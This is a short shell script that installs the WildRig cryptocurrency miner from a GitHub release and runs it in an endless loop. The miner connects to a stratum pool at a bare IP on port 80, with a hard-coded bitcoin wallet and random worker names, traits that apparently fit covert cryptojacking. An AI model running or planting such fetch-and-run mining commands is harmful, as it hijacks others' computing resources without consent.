apt update && apt -y install ocl-icd-opencl-dev curl wget sudo
curl https://github.com/andru-kun/wildrig-multi/releases/download/0.46.4/wildrig-multi-linux-0.46.4.tar.gz -L -o wildrig-multi-linux-0.46.4.tar.gz
tar xf wildrig-multi-linux-0.46.4.tar.gz
while :; do
./wildrig-multi -a qhash -o stratum+tcp://159.65.203.20:80 -u bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.$(echo $RANDOM | md5sum | head -c 10) -p x
done
